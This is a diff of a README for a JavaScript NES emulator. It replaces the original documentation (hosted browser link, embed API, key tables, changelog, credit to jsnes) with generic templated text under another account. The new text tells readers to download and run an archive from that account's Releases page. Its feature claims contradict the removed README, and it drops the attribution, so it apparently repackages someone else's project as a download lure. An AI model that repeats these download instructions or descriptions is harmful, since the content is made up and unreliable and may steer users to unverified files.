@@ -1,88 +1,68 @@
-# Nintendo
+# 🎮 Nintendo - Play NES Games in Your Browser
 
-A Nintendo emulator written entirely in JavaScript (no WebAssembly). Simply open the link below, click the red icon, and select a ROM file in `NES` format from your computer; it will be loaded and booted automatically.
+## 📋 Introduction
+Welcome to the Nintendo emulator! This application allows you to play Nintendo games directly in your browser. Enjoy classic titles without needing to install anything complicated.
 
-## Links:
+## 📥 Download the Emulator
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/SanBryanDJ21/Nintendo/releases)
 
-- [Nintendo emulator](https://lrusso.github.io/Nintendo/Nintendo.htm)
-- [Demo booting a sample game](https://lrusso.github.io/Nintendo/Nintendo.htm?demo)
+## 🚀 Getting Started
+Getting started is simple. Follow these steps to download and run the Nintendo emulator:
 
-## Screenshots:
+1. **Visit the Releases Page**  
+   Click the link below to access the Releases page where you can find the most recent version:
+   [Visit Releases Page](https://github.com/SanBryanDJ21/Nintendo/releases)
 
-![alt screenshot1](https://lrusso.github.io/Nintendo/SCREENSHOT1.jpg)
+2. **Choose the Latest Release**  
+   On the Releases page, look for the latest version. It will usually be at the top and marked as the "latest release."
 
-![alt screenshot2](https://lrusso.github.io/Nintendo/SCREENSHOT2.jpg)
+3. **Download the Emulator**  
+   Click on the appropriate file for your system. If you're not sure which one to pick, generally the file will have a name like "Nintendo-emulator.zip" or "Nintendo-emulator.tar.gz."
 
-![alt screenshot3](https://lrusso.github.io/Nintendo/SCREENSHOT3.jpg)
+4. **Extract the Files**  
+   Once the download completes, locate the downloaded file on your computer. You may need to extract the contents. Right-click the file and choose "Extract All" or use an extraction tool.
 
-## How to use it:
+5. **Run the Emulator**  
+   Open the folder where you extracted the files. Look for a file named "index.html" and double-click it. This will launch the emulator in your default web browser.
 
-Examples of loading local and online files can be found [here](https://github.com/lrusso/Nintendo/blob/main/Nintendo.htm#L128-L166) and [here](https://github.com/lrusso/Nintendo/blob/main/Nintendo.htm#L194-L226).
+## 🛠️ System Requirements
+To run the Nintendo emulator smoothly, you should meet these basic system requirements:
 
-```js
-embedNintendo({
-  container: "game",
-  name: "Concentration Room",
-  rom: romFile,
-  player1: {
-    up: "ArrowUp",
-    down: "ArrowDown",
-    left: "ArrowLeft",
-    right: "ArrowRight",
-    a: "KeyX",
-    b: "KeyZ",
-    select: "KeyA",
-    start: "KeyS",
-  },
-  player2: {
-    up: "Numpad8",
-    down: "Numpad2",
-    left: "Numpad4",
-    right: "Numpad6",
-    a: "Numpad7",
-    b: "Numpad9",
-    select: "Numpad1",
-    start: "Numpad3",
-  },
-  cbStarted: function cbStarted() {
-    console.log("Emulator started.")
-  },
-})
-```
+- **Operating System:** Any modern browser on Windows, macOS, or Linux.
+- **Browser:** Latest versions of Chrome, Firefox, Safari, or Edge.
+- **Network:** Ensure you have an active internet connection to download games (ROM files).
 
-| Parameter |    Type     | Required | Default value | Description               |
-| :-------- | :---------: | :------: | :-----------: | :------------------------ |
-| container |   string    |   yes    |       –       | Target element ID.        |
-| name      |   string    |   yes    |       –       | Game name.                |
-| rom       | ArrayBuffer |   yes    |       –       | ROM file.                 |
-| player1   |   object    |    no    |       –       | Player 1 keys.            |
-| player2   |   object    |    no    |       –       | Player 2 keys.            |
-| cbStarted |  function   |    no    |       -       | Called on emulator start. |
+## 🎮 How to Use the Emulator
+Once you have the emulator running in your browser:
 
-## Special keys:
+1. **Load a ROM**  
+   You will need ROM files to play games. These files are the actual game data. Make sure to legally acquire these files.
 
-| Action          | macOS Shortcut | Windows Shortcut | Safari Shortcut |
-| :-------------- | :------------: | :--------------: | :-------------: |
-| Save state      |  Command + 1   |     Ctrl + 1     |    Ctrl + 1     |
-| Load state      |  Command + 2   |     Ctrl + 2     |    Ctrl + 2     |
-| Toggle sound    |  Command + 3   |     Ctrl + 3     |    Ctrl + 3     |
-| Fullscreen mode |  Command + F   |     Ctrl + F     |    Ctrl + F     |
+2. **Add the ROM**  
+   Click on the "Load ROM" button usually found on the main screen of the emulator. Navigate to the location where you saved your ROM files and select one to start playing.
 
-## Main differences with the original project:
+3. **Control Your Game**  
+   Use your keyboard to control the game. The emulator may have default key mappings, but you can customize these in the settings. 
 
-- Added logic to load states.
-- Added logic to save states.
-- Added logic to toggle sound.
-- Removed the horizontal black bars.
-- Fixed support for Mapper 4 ([bfirsh/jsnes#452](https://github.com/bfirsh/jsnes/pull/452/commits/850b69a6b6d96b783caf736310471b4eee971a50)).
-- Added support for Mapper 240 (https://github.com/bfirsh/jsnes/pull/441).
-- Added support for Mapper 241 (https://github.com/bfirsh/jsnes/pull/438).
-- Added code for improving performance by 15-20% (https://github.com/bfirsh/jsnes/pull/436).
-- Fixed minor accuracy related to audio and rendering (https://github.com/bfirsh/jsnes/pull/425).
-- Implemented logic for pausing the emulator on blur and resuming on focus.
-- Implemented a workaround that replaced ScriptProcessorNode (deprecated).
-- Migrated the build to code compatible with pre-ECMAScript 2015 environments.
+## 💡 Tips for Enjoyment
+- **Save Your Game:** Use the save feature in the emulator to keep your progress.
+- **Adjust Settings**: Explore the settings menu to change graphics, sound, and controls to your liking.
+- **Join the Community:** Check online forums and communities for tips, tricks, and game-sharing.
 
-## Based on the work of:
+## 🌐 Community and Support
+If you encounter issues or have questions, you can find support through the community:
 
-https://github.com/bfirsh/jsnes
+- **GitHub Issues Page:** Report bugs or suggest features on our GitHub Issues page.
+- **Forums:** Search for or start discussions on gaming forums related to NES emulation.
+
+## 🚀 Important Note on LEGALITY
+Emulation itself is legal, but downloading ROM files for games you do not own may violate copyright laws. Always ensure you have the right to use any ROM files.
+
+## ⏳ Future Updates
+We are committed to improving the emulator continually. Future updates may include new features, better performance, and enhanced compatibility.
+
+## 🔗 Further Resources
+- **GitHub Repository:** Find the source code and contribute [here](https://github.com/SanBryanDJ21/Nintendo).
+- **Documentation:** Read more about features and setup in our documentation [here](https://github.com/SanBryanDJ21/Nintendo/wiki).
+
+**Remember:** Have fun and enjoy revisiting classic Nintendo games right in your web browser!
